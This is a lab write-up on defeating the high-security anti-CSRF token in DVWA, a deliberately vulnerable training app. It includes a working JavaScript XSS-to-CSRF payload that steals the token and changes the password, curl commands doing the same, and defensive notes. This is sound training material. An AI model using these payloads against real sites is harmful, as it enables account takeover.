# DVWA CSRF — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/csrf/

## Source Code Behavior (High)
- Includes a CSRF token (`user_token`) in the form
- Token checked server-side before processing password change
- Must submit valid token with the request

## Key Differences from Medium
1. Anti-CSRF token added to the form
2. Token must be submitted with the request
3. Need to first fetch the page to get the token, then submit with it

## Bypass Techniques

### XSS + CSRF chain
If you can find an XSS vulnerability elsewhere in DVWA (e.g., stored XSS), you can:
1. Use XSS to fetch the CSRF page and extract the token
2. Then submit the password change with the stolen token

### JavaScript payload to chain XSS → CSRF
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/vulnerabilities/csrf/', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    var token = xhr.responseText.match(/user_token.*?value="(.*?)"/)[1];
    var xhr2 = new XMLHttpRequest();
    xhr2.open('GET', '/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=' + token, true);
    xhr2.withCredentials = true;
    xhr2.send();
  }
};
xhr.send();
```

### Using stored XSS to deliver the attack
Inject the above script via the stored XSS vulnerability (guestbook).

## Step-by-Step Exploitation
1. Confirm CSRF token present in form (view source)
2. Direct CSRF attack fails — token is required
3. Use Stored XSS vulnerability to inject JavaScript
4. JavaScript fetches CSRF page, extracts token, submits password change
5. This demonstrates vulnerability chaining

## curl Commands
```bash
# Step 1: Fetch the page to get token
TOKEN=$(curl -s "http://127.0.0.1:4280/vulnerabilities/csrf/" \
  -b "PHPSESSID=<session>;security=high" \
  | grep -oP "user_token.*?value='\K[^']+")

# Step 2: Submit password change with token
curl -v "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=$TOKEN" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- CSRF token is proper protection, but can be defeated via XSS
- Demonstrates why XSS and CSRF are related — XSS can bypass CSRF protections
- In real-world: CSRF token + XSS prevention together provide proper defense
- Same-origin policy allows JavaScript on the same domain to read the token
